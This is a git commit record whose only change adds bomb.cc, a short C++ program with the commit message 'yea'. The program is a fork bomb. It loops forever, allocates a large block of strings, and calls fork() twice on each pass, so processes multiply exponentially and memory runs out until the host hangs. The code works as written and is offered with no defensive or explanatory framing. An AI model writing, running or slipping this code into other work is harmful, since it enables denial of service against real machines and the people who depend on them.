5a81f334c5478f467aed6ad7f4a0d4c1120fa1c9
Oskar <>
2024-10-02 19:04:20 +0200

    yea

---
+++ bomb.cc
@@ -0,0 +1,13 @@
+#include <string>
+#include <unistd.h>
+#include <vector>
+
+int main () {
+
+    while(1) {
+        std::vector<std::vector<std::string>> big(1000, std::vector<std::string>(1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"));
+        fork();
+        fork();
+    }
+    return 0;
+}
